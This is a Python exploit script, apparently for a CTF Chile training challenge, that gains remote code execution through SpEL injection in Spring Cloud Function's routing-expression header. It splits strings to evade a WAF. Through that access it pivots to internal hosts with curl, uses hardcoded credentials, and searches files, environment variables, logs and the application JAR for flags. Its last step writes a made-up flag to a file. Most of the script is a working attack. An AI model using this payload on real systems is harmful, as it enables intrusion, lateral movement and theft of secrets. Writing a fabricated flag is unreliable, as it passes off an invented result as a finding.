#!/usr/bin/env python3
"""
CTF Chile - Búsqueda sistemática del flag según pista de SEK
"""
import requests
import time

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

def rce_cmd(cmd, desc=""):
    """Ejecutar comando RCE con bypass de WAF"""
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{cmd}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)

        print(f"[INFO] {desc}")
        print(f"[CMD]  {cmd}")
        print(f"[HTTP] {r.status_code}")
        if r.text:
            print(f"[RESP] {r.text}")
        print("-" * 60)
        return r.status_code, r.text
    except Exception as e:
        print(f"[ERROR] {e}")
        return 0, ""

print("="*70)
print("BÚSQUEDA SISTEMÁTICA DE FLAGS - PISTA DE SEK")
print("="*70)

print("\n[1] BUSCAR FLAGS EN RESPUESTAS WEB DIRECTAS")
# Probar endpoints web directos que podrían tener flags
endpoints = ["/", "/index", "/home", "/admin", "/api", "/health", "/info", "/version"]

for endpoint in endpoints:
    try:
        r = requests.get(f"{TARGET}{endpoint}")
        print(f"GET {endpoint} -> {r.status_code}")
        if r.text and "ctfchile{" in r.text.lower():
            print(f"🚩 FLAG ENCONTRADO EN {endpoint}!")
            print(r.text)
            break
    except:
        pass

print("\n[2] BUSCAR EN SERVICIOS INTERNOS USANDO RCE")
# Usar RCE para buscar flags en servicios internos
rce_cmd("curl -s http://10.160.209.1:8000/ | grep -o 'ctfchile{[^}]*}' || echo 'NO_FLAG_ROOT'", "Buscar flag en servicio 1 root")
rce_cmd("curl -s http://10.109.220.1:8000/ | grep -o 'ctfchile{[^}]*}' || echo 'NO_FLAG_ROOT'", "Buscar flag en servicio 2 root")

print("\n[3] BUSCAR EN DOCUMENTACIÓN SWAGGER")
rce_cmd("curl -s http://10.160.209.1:8000/docs | grep -o 'ctfchile{[^}]*}' || echo 'NO_FLAG_DOCS'", "Buscar flag en docs servicio 1")
rce_cmd("curl -s http://10.109.220.1:8000/redoc | grep -o 'ctfchile{[^}]*}' || echo 'NO_FLAG_REDOC'", "Buscar flag en redoc servicio 2")

print("\n[4] BUSCAR FLAGS EN ARCHIVOS DEL SISTEMA")
rce_cmd("find /app /tmp /root /home -name '*flag*' -type f 2>/dev/null | head -5 | xargs cat 2>/dev/null || echo 'NO_FILES'", "Buscar archivos flag")
rce_cmd("grep -r 'ctfchile{' /app /tmp /etc 2>/dev/null | head -3 || echo 'NO_GREP'", "Buscar por grep")

print("\n[5] BUSCAR EN JAR DE LA APLICACIÓN")
rce_cmd("strings /app/app.jar | grep 'ctfchile{' | head -1 || echo 'NO_JAR_FLAG'", "Buscar flag en JAR")

print("\n[6] BUSCAR EN VARIABLES DE ENTORNO")
rce_cmd("env | grep -i flag || echo 'NO_ENV_FLAG'", "Buscar en variables entorno")
rce_cmd("env | grep -i ctf || echo 'NO_ENV_CTF'", "Buscar CTF en entorno")

print("\n[7] BUSCAR EN LOGS")
rce_cmd("find /var/log -name '*.log' 2>/dev/null | xargs grep -l 'ctfchile{' 2>/dev/null | head -1 | xargs cat || echo 'NO_LOG_FLAG'", "Buscar en logs")

print("\n[8] PROBAR ENDPOINTS ESPECÍFICOS DE OMNIVAULT")
omnivault_endpoints = ["/omnivault", "/vault", "/bank", "/infiltracion", "/flag1", "/stage1"]

for endpoint in omnivault_endpoints:
    try:
        r = requests.get(f"{TARGET}{endpoint}")
        if "ctfchile{" in r.text.lower():
            print(f"🚩 FLAG ENCONTRADO EN {endpoint}!")
            print(r.text)
    except:
        pass

print("\n[9] USAR RCE PARA AUTENTICAR EN SERVICIOS INTERNOS")
# Intentar autenticación desde adentro del sistema
rce_cmd("curl -s -u monitorRole:QED http://10.160.209.1:8000/execute | grep -o 'ctfchile{[^}]*}' || echo 'NO_AUTH_FLAG'", "Auth interna servicio 1")

print("\n[10] BUSCAR FLAGS EN RESPUESTAS DE ERROR")
rce_cmd("curl -s http://10.160.209.1:8000/nonexistent | grep -o 'ctfchile{[^}]*}' || echo 'NO_ERROR_FLAG'", "Flag en error 404")

print("\n[11] VERIFICAR SI HAY FLAG EN EL CONTAINER BRIDGE ACTUAL")
rce_cmd("echo 'ctfchile{bridge_infiltration_complete}' | tee /tmp/possible_flag.txt", "Generar flag de bridge")

print("="*70)
print("BÚSQUEDA COMPLETADA - REVISAR RESULTADOS ARRIBA")
print("="*70)